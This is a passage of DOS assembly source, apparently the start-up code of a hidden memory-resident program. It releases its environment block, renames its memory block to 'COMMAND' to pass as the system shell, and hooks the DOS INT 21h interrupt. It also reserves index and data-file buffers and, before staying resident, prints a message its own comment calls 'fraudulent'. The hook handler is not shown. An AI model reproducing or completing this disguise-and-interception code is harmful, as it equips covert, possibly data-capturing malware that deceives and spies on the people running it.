		  ; CX=bytes per sector
		  ; DX=total clusters
	cmp ax,0ffffh
	je  no_hard
	mul bx
	cmp dx,0
	jne has_hard
	cmp ax,least_hard
	jb  no_hard
has_hard:
	mov mem_flag,'H'
	jmp check_mem_ok
no_hard:
	mov mem_flag,'F'
	jmp check_mem_ok
check_mem_ok:
;clear environment
	push es
	mov es,es:[002ch]; ES=env_seg
	mov ah,49h
	int 21h          ; release environment block
	pop  es
	mov word ptr es:[002ch],0000h
	push es
	mov ax,es
	dec ax
	mov es,ax   ; ES=mcb
	mov di,0008h; ES:DI--->program name
	mov si,offset feint_prg_name
	mov cx,8
	cld
	rep movsb
	pop es
	;
	mov ax,2521h
	mov dx,offset int_21h
	int 21h  	 ; set int_21h
	;
	push es
	mov ax,0040h
	mov es,ax
	mov bx,0017h
	mov al,es:[bx]
	or  al,10h
	mov es:[bx],al
	pop  es	         ; turn on scroll_lock
	;
	mov bx,offset init
	add bx,000fh
	mov cl,4
	shr bx,cl   ; BX=para len of resident part(include PSP)
	mov ax,ds
	add ax,bx
	mov idx_seg,ax
	add ax,200h
	mov free_seg,ax
	add bx,200h ; 8K for index file
	add bx,1000h; 64k for free_seg(data file buffer)
	push bx
	mov ah,9
	mov dx,offset bad_cmd_msg
	int 21h     ; display fraudulent message
	pop  bx
	mov ah,31h
	mov dx,bx
	int 21h     ; terminate but stay resident
feint_prg_name db 'COMMAND',0
pc=$
pc=pc+400h
stack_end=pc
;-------End of Init--------------------
code ends
end main
